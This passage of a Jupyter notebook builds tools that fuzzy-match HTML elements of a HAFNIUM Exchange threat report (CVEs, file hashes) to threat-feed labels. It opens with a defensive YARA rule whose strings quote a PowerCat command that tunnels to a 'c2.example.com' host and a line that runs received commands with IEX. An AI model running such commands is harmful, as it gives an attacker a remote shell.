    "    \"content\": 'rule HKTL_PS1_PowerCat_Mar21 {   \\n      meta:   \\n         description = \"Detects PowerCat hacktool\"   \\n         author = \"Florian Roth\"   \\n         reference = \"https://github.com/besimorhino/powercat\"   \\n         date = \"2021-03-02\"   \\n         hash1 = \"c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2\"   \\n      strings:   \\n         $x1 = \"powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com\" ascii fullword   \\n         $x2 = \"try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}\" ascii fullword   \\n      \\n         $s1 = \"Returning Encoded Payload...\" ascii   \\n         $s2 = \"$CommandToExecute =\" ascii fullword   \\n         $s3 = \"[alias(\\\\\"Execute\\\\\")][string]$e=\\\\\"\\\\\",\" ascii   \\n      condition:   \\n         uint16(0) == 0x7566 and   \\n         filesize < 200KB and   \\n         1 of ($x*) or 3 of them   \\n   }',\n",
    "    \"title\": \"HKTL_PS1_PowerCat_Mar21\",\n",
    "    \"description\": \"Detects PowerCat hacktool\",\n",
    "    \"expiration\": \"\",\n",
    "    \"is_active\": 1,\n",
    "    \"role\": \"\",\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Fuzzy Join"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-10-05T10:23:02.306461Z",
     "start_time": "2021-10-05T10:22:47.287016Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<table>\n",
       "<tbody>\n",
       "<tr><td>Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to</td><td>   </td><td>&lt;Element p at 0x1333f9648&gt;</td><td>text</td><td>(3, 498)  </td><td>(0, 495)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;description&#x27;), group=0, role=None)</td></tr>\n",
       "<tr><td>HAFNIUM                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       </td><td>   </td><td>&lt;Element a at 0x1333f9688&gt;</td><td>text</td><td>(103, 110)</td><td>(0, 7)    </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;adversary&#x27;), group=0, role=None)  </td></tr>\n",
       "<tr><td>CVE-2021-26855                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(50, 64)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>CVE-2021-26857                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(66, 80)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>CVE-2021-26858                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(82, 96)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>CVE-2021-27065                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(102, 116)</td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>Azure Sentinel                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>   </td><td>&lt;Element a at 0x1333f9808&gt;</td><td>text</td><td>(69, 83)  </td><td>(0, 14)   </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>Covenant                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </td><td>   </td><td>&lt;Element a at 0x1333f99c8&gt;</td><td>text</td><td>(34, 42)  </td><td>(0, 8)    </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>CVE-2021-26855                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element a at 0x1333f9b88&gt;</td><td>text</td><td>(63, 77)  </td><td>(0, 14)   </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>CVE-2021-26857                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element a at 0x1333f9c08&gt;</td><td>text</td><td>(63, 77)  </td><td>(0, 14)   </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "</tbody>\n",
       "</table><p>Showing 10 of 36 rows"
      ],
      "text/plain": [
       "[('Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to ', None, <Element p at 0x1333f9648>, 'text', (3, 498), (0, 495), Label(type=('pulse', 'description'), group=0, role=None)), ('HAFNIUM', None, <Element a at 0x1333f9688>, 'text', (103, 110), (0, 7), Label(type=('pulse', 'adversary'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (50, 64), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26857', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (66, 80), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26858', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (82, 96), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-27065', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (102, 116), Label(type=('pulse', 'tag'), group=0, role=None)), ('Azure Sentinel', None, <Element a at 0x1333f9808>, 'text', (69, 83), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('Covenant', None, <Element a at 0x1333f99c8>, 'text', (34, 42), (0, 8), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9b88>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26857', 'CVE', <Element a at 0x1333f9c08>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26858', 'CVE', <Element a at 0x1333f9c88>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9c88>, 'tail', (139, 478), (253, 267), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-27065', 'CVE', <Element a at 0x1333f9d08>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9d08>, 'tail', (139, 478), (253, 267), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element li at 0x133400748>, 'text', (4, 91), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26858', 'CVE', <Element li at 0x133400ac8>, 'text', (4, 76), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26857', 'CVE', <Element li at 0x133400d48>, 'text', (4, 87), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-27065', 'CVE', <Element li at 0x13340c048>, 'text', (4, 86), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('b75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0', 'FileHash-SHA256', <Element li at 0x13340c4c8>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=8, role=None)), ('097549cf7d0f76f0d99edf8b2d91c60977fd6a96e4b8c3c94b0b1733dc026d3e', 'FileHash-SHA256', <Element li at 0x13340c508>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=1, role=None)), ('2b6f1ebb2208e93ade4a6424555d6a8341fd6d9f60c25e44afe11008f5c1aad1', 'FileHash-SHA256', <Element li at 0x13340c548>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=3, role=None)), ('65149e036fff06026d80ac9ad4d156332822dc93142cf1a122b1841ec8de34b5', 'FileHash-SHA256', <Element li at 0x13340c588>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=6, role=None)), ('511df0e2df9bfa5521b588cc4bb5f8c5a321801b803394ebc493db1ef3c78fa1', 'FileHash-SHA256', <Element li at 0x13340c5c8>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=5, role=None)), ('4edc7770464a14f54d17f36dc9d0fe854f68b346b27b35a6f5839adf1f13f8ea', 'FileHash-SHA256', <Element li at 0x13340c608>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=4, role=None)), ('811157f9c7003ba8d17b45eb3cf09bef2cecd2701cedb675274949296a6a183d', 'FileHash-SHA256', <Element li at 0x13340c648>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=7, role=None)), ('1631a90eb5395c4e19c7dbcbf611bbe6444ff312eb7937e286e4637cb9e72944', 'FileHash-SHA256', <Element li at 0x13340c688>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=2, role=None)), ('Procdump', None, <Element a at 0x13340d508>, 'text', (75, 83), (0, 8), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (242, 256), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26857', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (258, 272), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-27065', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (274, 288), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26858', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (293, 307), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26858', 'CVE', <Element p at 0x13340e208>, 'text', (3, 221), (189, 203), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26857', 'CVE', <Element p at 0x13340e348>, 'text', (3, 154), (122, 136), Label(type=('pulse', 'tag'), group=0, role=None)), ('powershell.exe', 'FilePath', <Element code at 0x13340e588>, 'text', (6, 187), (66, 80), Label(type=('pulse', 'tag'), group=0, role=None)), ('powershell.exe', 'FilePath', <Element code at 0x13340e648>, 'text', (6, 223), (77, 91), Label(type=('pulse', 'tag'), group=0, role=None)), ('powershell.exe', 'FilePath', <Element code at 0x13340e708>, 'text', (6, 345), (77, 91), Label(type=('pulse', 'tag'), group=0, role=None))]"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "seq(analyzer.primary_subtree_leafs).map(product_by_contents).flatten().starmap(\n",
    "    product_by_entities\n",
    ").flatten().starmap(\n",
    "    lambda element, content, text: (\n",
    "        text.string,\n",
    "        text.entity,\n",
    "        # element.sourceline,\n",
    "        element,\n",
    "        content.property,\n",
    "        content.span,\n",
    "        text.span,\n",
    "    )\n",
    ").starmap(\n",
    "    lambda string, entity, element, prop, content_span, text_span: (\n",
    "        string,\n",
    "        entity,\n",
    "        element,\n",
    "        prop,\n",
    "        content_span,\n",
    "        text_span,\n",
    "        fl.match_label(string, method=\"fuzzy_match\"),\n",
    "    )\n",
    ").distinct().filter(\n",
    "    lambda x: x[6] != None\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Pipe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# get parent-child elements labels"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Example:\n",
    "\n",
    "```html\n",
    "    <p>\n",
    "        \"Game studio CD Projekt Red recently \"\n",
    "        <a href=\"https://<url>\" target=\"...\" rel=\"...\">disclosed</a>\n",
    "        \" that it became a victim of a targeted, highly-impactful ransomware. In the days following the disclosure, it was revealed that the ransomware family most likely behind the attack was “HelloKitty”.?\n",
    "    </p>\n",
    " ```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "class FeedLabeler(object):\n",
    "    \n",
    "    class MatchThreshold(Enum):\n",
    "        exactly_match = 1\n",
    "        fuzzy_match = 0.9\n",
    "    \n",
    "    def __init__(self, feed):\n",
    "        self.feed = feed\n",
    "\n",
    "    @property\n",
    "    def pulse(self):\n",
    "        pulse = PulseLabel(self.feed)\n",
    "        pulse = seq(pulse.get_labels()).cache()\n",
    "        return pulse.to_dict()\n",
    "\n",
    "    @property\n",
    "    def indicators(self):\n",
    "        indicators = self.feed.get(\"indicators\")\n",
    "        indicators = (\n",
    "            seq(indicators)\n",
    "            .enumerate(1)\n",
    "            .map(lambda indicator: IndicatorLabel(*indicator))\n",
    "            .map(lambda indicator: indicator.get_labels())\n",
    "            .flatten()\n",
    "            .cache()\n",
    "        )\n",
    "        return indicators.to_dict()\n",
    "\n",
    "    @property\n",
    "    def labels(self):\n",
    "        return ChainMap(self.pulse, self.indicators)\n",
    "\n",
    "    def match_label(self, string, method=\"fuzzy_match\"):\n",
    "\n",
    "        # match\n",
    "        matching_results = (\n",
    "            seq(self.labels.items())\n",
    "            .starmap(lambda k, v: (jaro.normalized_similarity(k, string), v))\n",
    "            .filter(lambda similar_string: similar_string[0] >= self.MatchThreshold[method].value)\n",
    "            .sorted(lambda similar_string: similar_string[0], reverse=True)\n",
    "            .cache()\n",
    "        )\n",
    "\n",
    "        if matching_results.empty():\n",
    "            label = None\n",
    "        else:\n",
    "            label = matching_results.starmap(lambda similarity, label: label).first()\n",
    "\n",
    "        return label\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "class ElementLabeler(object):\n",
    "\n",
    "    \"\"\"\n",
    "    For Text Formatting\n",
    "    \"\"\"\n",
    "\n",
    "    \"\"\"\n",
    "    <p>\n",
    "        \"Game studio CD Projekt Red recently \"\n",
    "        <a href=\"https://<url>\" target=\"...\" rel=\"...\">disclosed</a>\n",
    "        \" that it became a victim of a targeted, highly-impactful ransomware.\n",
    "    </p>\n",
    "    \"\"\"\n",
    "\n",
    "    def __init__(self, printable_elements, feed_labeler):\n",
    "        self.printable_elements = printable_elements\n",
    "        self.feed_labeler = feed_labeler\n",
    "\n",
    "    @property\n",
    "    def formattingtext_families(self):\n",
    "        # get ancestor elements which has descendants one in printable elements\n",
    "        ancestors = seq(self.printable_elements).filter(\n",
    "            lambda element: seq(element.iterdescendants()).intersection(\n",
    "                self.printable_elements\n",
    "            )\n",
    "        )\n",
    "        # conbine ancestor element and its descendants\n",
    "        families = ancestors.map(\n",
    "            lambda element: [element] + list(element.iterdescendants())\n",
    "        )\n",
    "        return families\n",
    "\n",
    "    @staticmethod\n",
    "    def extract_text(elements):\n",
    "        \"\"\"\n",
    "        product_by_contents = lambda element: product(\n",
    "            [element], extractor.get_contents(element)\n",
    "        )\n",
    "\n",
    "        product_by_entities = lambda element, content: product(\n",
    "            [element], [content], parser.iterscan(content)\n",
    "        )\n",
    "        \"\"\"\n",
    "\n",
    "        text = (\n",
    "            seq(elements)\n",
    "            .map(product_by_contents)\n",
    "            .flatten()\n",
    "            .starmap(product_by_entities)\n",
    "            .flatten()\n",
    "            .starmap(lambda element, content, text: text.string)\n",
    "            .make_string(\" \")\n",
    "        )\n",
    "\n",
    "        return text\n",
    "\n",
    "    def make_labels(self):\n",
    "\n",
    "        labels = (\n",
    "            self.formattingtext_families.map(\n",
    "                lambda elements: (elements, self.extract_text(elements))\n",
    "            )\n",
    "            .starmap(lambda elements, string: product(elements, [string]))\n",
    "            .flatten()\n",
    "            .starmap(\n",
    "                lambda element, string: (\n",
    "                    element,\n",
    "                    self.feed_labeler.match_label(string, method=\"fuzzy_match\"),\n",
    "                )\n",
    "            )\n",
    "            .filter(lambda element_label: element_label[1] is not None)\n",
    "            .to_dict()\n",
    "        )\n",
    "\n",
    "        return labels\n",
    "\n",
    "    @property\n",
    "    @lru_cache()\n",
    "    def labels(self):\n",
    "        return self.make_labels()\n",
    "\n",
    "    def match_label(self, element):\n",
    "        return self.labels.get(element)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "el = ElementLabeler(analyzer.primary_subtree_leafs, fl)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{<Element p at 0x1333f9648>: Label(type=('pulse', 'description'), group=0, role=None),\n",
       " <Element a at 0x1333f9688>: Label(type=('pulse', 'description'), group=0, role=None)}"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "el.labels"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<table>\n",
       "<tbody>\n",
       "<tr><td>Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to</td><td>   </td><td>&lt;Element p at 0x1333f9648&gt;</td><td>text</td><td>(3, 498)  </td><td>(0, 495)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;description&#x27;), group=0, role=None)</td><td>Label(type=(&#x27;pulse&#x27;, &#x27;description&#x27;), group=0, role=None)</td></tr>\n",
       "<tr><td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              </td><td>   </td><td>&lt;Element p at 0x1333f9648&gt;</td><td>tail</td><td>(739, 740)</td><td>(0, 1)    </td><td>                                                        </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;description&#x27;), group=0, role=None)</td></tr>\n",
       "<tr><td>HAFNIUM                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       </td><td>   </td><td>&lt;Element a at 0x1333f9688&gt;</td><td>text</td><td>(103, 110)</td><td>(0, 7)    </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;adversary&#x27;), group=0, role=None)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;description&#x27;), group=0, role=None)</td></tr>\n",
       "<tr><td>, a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.                                                                                                                                                                                                                                                                                                                                                                                   </td><td>   </td><td>&lt;Element a at 0x1333f9688&gt;</td><td>tail</td><td>(114, 237)</td><td>(0, 123)  </td><td>                                                        </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;description&#x27;), group=0, role=None)</td></tr>\n",
       "<tr><td>CVE-2021-26855                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(50, 64)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td><td>                                                        </td></tr>\n",
       "<tr><td>CVE-2021-26857                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(66, 80)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td><td>                                                        </td></tr>\n",
       "<tr><td>CVE-2021-26858                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(82, 96)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td><td>                                                        </td></tr>\n",
       "<tr><td>CVE-2021-27065                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(102, 116)</td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td><td>                                                        </td></tr>\n",
       "<tr><td>Azure Sentinel                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>   </td><td>&lt;Element a at 0x1333f9808&gt;</td><td>text</td><td>(69, 83)  </td><td>(0, 14)   </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td><td>                                                        </td></tr>\n",
       "<tr><td>Covenant                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </td><td>   </td><td>&lt;Element a at 0x1333f99c8&gt;</td><td>text</td><td>(34, 42)  </td><td>(0, 8)    </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td><td>                                                        </td></tr>\n",
       "</tbody>\n",
       "</table><p>Showing 10 of 38 rows"
      ],
      "text/plain": [
       "[('Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to ', None, <Element p at 0x1333f9648>, 'text', (3, 498), (0, 495), Label(type=('pulse', 'description'), group=0, role=None), Label(type=('pulse', 'description'), group=0, role=None)), ('\\n', None, <Element p at 0x1333f9648>, 'tail', (739, 740), (0, 1), None, Label(type=('pulse', 'description'), group=0, role=None)), ('HAFNIUM', None, <Element a at 0x1333f9688>, 'text', (103, 110), (0, 7), Label(type=('pulse', 'adversary'), group=0, role=None), Label(type=('pulse', 'description'), group=0, role=None)), (', a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.', None, <Element a at 0x1333f9688>, 'tail', (114, 237), (0, 123), None, Label(type=('pulse', 'description'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (50, 64), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26857', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (66, 80), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26858', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (82, 96), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-27065', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (102, 116), Label(type=('pulse', 'tag'), group=0, role=None), None), ('Azure Sentinel', None, <Element a at 0x1333f9808>, 'text', (69, 83), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None), None), ('Covenant', None, <Element a at 0x1333f99c8>, 'text', (34, 42), (0, 8), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9b88>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26857', 'CVE', <Element a at 0x1333f9c08>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26858', 'CVE', <Element a at 0x1333f9c88>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9c88>, 'tail', (139, 478), (253, 267), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-27065', 'CVE', <Element a at 0x1333f9d08>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9d08>, 'tail', (139, 478), (253, 267), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26855', 'CVE', <Element li at 0x133400748>, 'text', (4, 91), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26858', 'CVE', <Element li at 0x133400ac8>, 'text', (4, 76), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26857', 'CVE', <Element li at 0x133400d48>, 'text', (4, 87), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-27065', 'CVE', <Element li at 0x13340c048>, 'text', (4, 86), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None), None), ('b75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0', 'FileHash-SHA256', <Element li at 0x13340c4c8>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=8, role=None), None), ('097549cf7d0f76f0d99edf8b2d91c60977fd6a96e4b8c3c94b0b1733dc026d3e', 'FileHash-SHA256', <Element li at 0x13340c508>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=1, role=None), None), ('2b6f1ebb2208e93ade4a6424555d6a8341fd6d9f60c25e44afe11008f5c1aad1', 'FileHash-SHA256', <Element li at 0x13340c548>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=3, role=None), None), ('65149e036fff06026d80ac9ad4d156332822dc93142cf1a122b1841ec8de34b5', 'FileHash-SHA256', <Element li at 0x13340c588>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=6, role=None), None), ('511df0e2df9bfa5521b588cc4bb5f8c5a321801b803394ebc493db1ef3c78fa1', 'FileHash-SHA256', <Element li at 0x13340c5c8>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=5, role=None), None), ('4edc7770464a14f54d17f36dc9d0fe854f68b346b27b35a6f5839adf1f13f8ea', 'FileHash-SHA256', <Element li at 0x13340c608>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=4, role=None), None), ('811157f9c7003ba8d17b45eb3cf09bef2cecd2701cedb675274949296a6a183d', 'FileHash-SHA256', <Element li at 0x13340c648>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=7, role=None), None), ('1631a90eb5395c4e19c7dbcbf611bbe6444ff312eb7937e286e4637cb9e72944', 'FileHash-SHA256', <Element li at 0x13340c688>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=2, role=None), None), ('Procdump', None, <Element a at 0x13340d508>, 'text', (75, 83), (0, 8), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26855', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (242, 256), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26857', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (258, 272), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-27065', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (274, 288), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26858', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (293, 307), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26858', 'CVE', <Element p at 0x13340e208>, 'text', (3, 221), (189, 203), Label(type=('pulse', 'tag'), group=0, role=None), None), ('CVE-2021-26857', 'CVE', <Element p at 0x13340e348>, 'text', (3, 154), (122, 136), Label(type=('pulse', 'tag'), group=0, role=None), None), ('powershell.exe', 'FilePath', <Element code at 0x13340e588>, 'text', (6, 187), (66, 80), Label(type=('pulse', 'tag'), group=0, role=None), None), ('powershell.exe', 'FilePath', <Element code at 0x13340e648>, 'text', (6, 223), (77, 91), Label(type=('pulse', 'tag'), group=0, role=None), None), ('powershell.exe', 'FilePath', <Element code at 0x13340e708>, 'text', (6, 345), (77, 91), Label(type=('pulse', 'tag'), group=0, role=None), None)]"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "seq(analyzer.primary_subtree_leafs).map(product_by_contents).flatten().starmap(\n",
    "    product_by_entities\n",
    ").flatten().starmap(\n",
    "    lambda element, content, text: (\n",
    "        text.string,\n",
    "        text.entity,\n",
    "        # element.sourceline,\n",
    "        element,\n",
    "        content.property,\n",
    "        content.span,\n",
    "        text.span,\n",
    "    )\n",
    ").starmap(\n",
    "    lambda string, entity, element, prop, content_span, text_span: (\n",
    "        string,\n",
    "        entity,\n",
    "        element,\n",
    "        prop,\n",
    "        content_span,\n",
    "        text_span,\n",
    "        fl.match_label(string, method=\"fuzzy_match\"),\n",
    "        el.match_label(element),\n",
    "    )\n",
    ").distinct().filter(\n",
    "    lambda x: x[6] != None or x[7] != None\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
